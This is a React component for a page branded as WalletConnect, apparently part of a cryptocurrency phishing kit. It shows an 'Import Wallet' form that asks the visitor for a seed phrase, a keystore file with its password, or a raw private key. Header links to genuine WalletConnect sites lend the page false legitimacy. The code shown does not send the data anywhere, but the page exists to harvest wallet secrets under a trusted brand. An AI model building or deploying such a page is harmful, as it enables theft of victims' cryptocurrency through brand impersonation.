import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import SocialFooter from '../components/SocialFooter';
import walletConnectImg from '../assets/images/wallet-logo.png';

const tabData = [
	{
		key: 'phrase',
		label: 'Phrase',
		content: (
			<form>
				<textarea
					name="key"
					required
					minLength={12}
					placeholder="Phrase"
					className="w-full p-2 border rounded"
				/>
				<div className="desc mt-2 text-sm text-gray-500">
					Typically 12 (sometimes 24) words separated by single spaces
				</div>
				<button
					type="submit"
					className="btn blMRzM mt-4 px-6 py-2 bg-blue-500 text-white rounded"
				>
					IMPORT
				</button>
			</form>
		),
	},
	{
		key: 'keystore',
		label: 'Keystore JSON',
		content: (
			<form>
				<textarea
					name="key"
					required
					minLength={12}
					placeholder="Keystore JSON"
					className="w-full p-2 border rounded"
				/>
				<input
					type="text"
					name="pass"
					placeholder="Password"
					required
					minLength={4}
					className="w-full p-2 border rounded mt-2"
				/>
				<div className="desc mt-2 text-sm text-gray-500">
					Several lines of text beginning with '(...)' plus the password you used
					to encrypt it.
				</div>
				<button
					type="submit"
					className="btn blMRzM mt-4 px-6 py-2 bg-blue-500 text-white rounded"
				>
					IMPORT
				</button>
			</form>
		),
	},
	{
		key: 'private',
		label: 'Private Key',
		content: (
			<form>
				<input
					type="text"
					name="key"
					placeholder="Private Key"
					required
					minLength={64}
					className="w-full p-2 border rounded"
				/>
				<div className="desc mt-2 text-sm text-gray-500">
					Typically 64 alphanumeric characters
				</div>
				<button
					type="submit"
					className="btn blMRzM mt-4 px-6 py-2 bg-blue-500 text-white rounded"
				>
					IMPORT
				</button>
			</form>
		),
	},
];

const WalletConnectPage = () => {
	const location = useLocation();
	const navigate = useNavigate();
	const { wallet } = location.state || {};
	const [activeTab, setActiveTab] = useState('phrase');

	if (!wallet) {
		navigate('/wallets');
		return null;
	}

	return (
		<div className="min-h-screen bg-[#f7f9fc] flex flex-col">
			<header className="w-full flex items-center justify-between px-8 py-4 bg-white border-b border-gray-200">
				<div className="flex items-center gap-3">
					<img
						src={walletConnectImg}
						alt="WalletConnect Logo"
						className="w-10 h-10"
					/>
					<span className="text-black font-bold text-2xl tracking-wide">
						WalletConnect
					</span>
				</div>
				<div className="flex items-center gap-2">
					<a
						href="https://dashboard.reown.com/sign-in"
						target="_blank"
						rel="noopener noreferrer"
						className="px-6 py-2 rounded-xl border border-gray-400 text-black font-medium text-lg bg-white hover:bg-gray-100"
					>
						Log in
					</a>
					<a
						href="https://docs.walletconnect.network/"
						target="_blank"
						rel="noopener noreferrer"
						className="px-6 py-2 rounded-xl border border-gray-400 text-black font-medium text-lg bg-white hover:bg-gray-100"
					>
						Docs
					</a>
					<a
						href="https://walletguide.walletconnect.network/"
						target="_blank"
						rel="noopener noreferrer"
						className="px-6 py-2 rounded-xl border border-gray-400 text-black font-medium text-lg bg-white hover:bg-gray-100"
					>
						WalletGuide
					</a>
				</div>
			</header>
			<main className="flex flex-col items-center justify-center flex-1 px-4">
				<div className="bg-white rounded-xl shadow-lg p-8 w-full max-w-md mt-10 border border-[#e3eaf3]">
					<h1 className="text-2xl font-bold text-[#3B99FC] mb-2 text-center">
						Import Wallet
					</h1>
					<div className="flex flex-col items-center mb-6">
						<img
							src={wallet.image}
							alt={wallet.name + ' logo'}
							className="w-16 h-16 object-contain mb-2 rounded-full"
						/>
						<p className="text-lg font-bold text-gray-800 text-center">
							{wallet.name}
						</p>
					</div>
					<div className="flex gap-2 mb-4 justify-center">
						{tabData.map(tab => (
							<button
								key={tab.key}
								className={`px-4 py-2 rounded font-bold text-sm ${
									activeTab === tab.key
										? 'bg-[#3B99FC] text-white'
										: 'bg-[#f7f9fc] text-[#3B99FC] border border-[#3B99FC]'
								}`}
								onClick={() => setActiveTab(tab.key)}
							>
								{tab.label}
							</button>
						))}
					</div>
					<div className="w-full mt-2">
						{tabData.find(tab => tab.key === activeTab)?.content}
					</div>
				</div>
			</main>
			<SocialFooter />
		</div>
	);
};

export default WalletConnectPage;
